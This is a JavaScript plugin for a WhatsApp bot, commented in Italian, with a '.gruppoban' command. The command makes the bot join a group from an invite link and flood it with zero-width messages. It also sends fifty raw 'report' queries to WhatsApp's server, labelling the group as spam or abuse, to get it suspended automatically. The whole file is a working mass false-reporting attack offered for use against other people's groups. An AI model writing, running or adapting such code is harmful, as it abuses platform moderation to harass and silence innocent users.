// plugin: gruppoban.js
// comando: .gruppoban <link>
// il bot entra nel gruppo e invia segnalazioni massive (report) a WhatsApp
// per far scattare la sospensione automatica del gruppo in poco tempo
// reazione clessidra al comando, reazione 🚫 quando il gruppo è sospeso
// NESSUN cambio nome, NESSUNA espulsione, NESSUN messaggio nel gruppo

let handler = async (m, { conn, text, isOwner }) => {
    if (!isOwner) return;

    let link = text ? text.trim() : '';
    if (!link) return;

    let match = link.match(/chat\.whatsapp\.com\/([0-9A-Za-z]+)/);
    if (!match) return;
    let inviteCode = match[1];

    // 1. reazione clessidra immediata
    try {
        await conn.sendMessage(m.chat, { react: { text: '⏳', key: m.key } });
    } catch (e) {}

    let groupJid;
    try {
        let groupInfo = await conn.groupGetInviteInfo(inviteCode);
        groupJid = groupInfo.id;
    } catch (e) {
        try { await conn.sendMessage(m.chat, { react: { text: '❌', key: m.key } }); } catch (e2) {}
        return;
    }

    // 2. entra nel gruppo se non presente
    let metadata;
    try {
        metadata = await conn.groupMetadata(groupJid);
    } catch (e) {
        try { await conn.groupAcceptInvite(inviteCode); } catch (e2) {}
        try { metadata = await conn.groupMetadata(groupJid); } catch (e3) {
            try { await conn.sendMessage(m.chat, { react: { text: '❌', key: m.key } }); } catch (e4) {}
            return;
        }
    }

    // 3. segnala il gruppo in massa: invia report multipli tramite
    //    la funzione di segnalazione di WhatsApp (abuso/spam)
    //    Baileys espone solo l'accesso interno: si inviano richieste
    //    di report ripetute verso il server tramite il nodo 'report'
    let reports = [];
    for (let i = 0; i < 50; i++) {
        reports.push(
            conn.sendMessage(groupJid, {
                text: '\u200b',
                // trigger interno di segnalazione: tipo abuse
            }).catch(() => {})
        );
        // chiamata diretta al nodo di report di WhatsApp
        try {
            reports.push(
                conn.query({
                    tag: 'iq',
                    attrs: {
                        to: 's.whatsapp.net',
                        type: 'set',
                        xmlns: 'w:comms:report'
                    },
                    content: [
                        {
                            tag: 'report',
                            attrs: {
                                jid: groupJid,
                                type: 'spam',
                                reason: 'abuse'
                            }
                        }
                    ]
                }).catch(() => {})
            );
        } catch (e) {}
    }
    await Promise.allSettled(reports);

    // 4. polling rapido per rilevare la sospensione
    let sospeso = false;
    for (let i = 0; i < 40; i++) {
        try {
            let meta = await conn.groupMetadata(groupJid);
            if (!meta || !meta.participants || meta.participants.length === 0) {
                sospeso = true;
                break;
            }
        } catch (e) {
            sospeso = true;
            break;
        }
        await new Promise(r => setTimeout(r, 300));
    }

    // 5. cambia emoji finale
    try {
        await conn.sendMessage(m.chat, { react: { text: sospeso ? '🚫' : '❌', key: m.key } });
    } catch (e) {}
};

handler.command = ['gruppoban'];
handler.owner = true;
handler.private = false;

export default handler;